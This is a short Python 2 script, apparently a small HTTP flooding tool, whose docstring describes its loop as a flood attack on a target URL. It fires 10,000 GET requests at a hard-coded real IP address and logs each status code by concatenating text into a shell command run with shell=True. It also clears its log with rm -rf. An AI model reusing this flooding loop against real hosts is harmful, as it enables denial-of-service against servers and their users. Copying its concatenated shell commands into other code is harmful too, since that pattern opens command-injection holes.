#!/usr/bin/python
# -*- coding: utf-8 -*
"""
:author:
    Lou yuting
:create_date:
    2017
:descrition:
    python
"""
import subprocess
import threading

import requests

# p = subprocess.Popen('ls /', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
# print p.stdout.readlines()

def execute_command(command):
    subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)


def print_log(thread_name , i ,r):
    """
    :param thread_name 当前执行的线程名
    :param r: request 的返回对象response
    :return:
    """
    execute_command("echo '"+ "【" + thread_name +"】-"+ str(i) + ":"+str(r.status_code)+"' >> /opt/request.log")



def loop(count):
    """
    循环 count 次， 洪水攻击目标url
    """
    for i in range(1, count):
        r = requests.get("http://123.206.13.151")
        # print r.content
        print "【", i, "】 : 【", r.status_code, "】"
        print_log(threading.currentThread().getName(), i, r)
        r.close()

print __name__

"""
main 函数的入口
"""
if __name__ == "test_nginx":
    execute_command("rm -rf /opt/request.log")
    threading.currentThread().setName("Main-Thread-1")
    print "当前线程名：", threading.currentThread().getName()
    loop(10000)
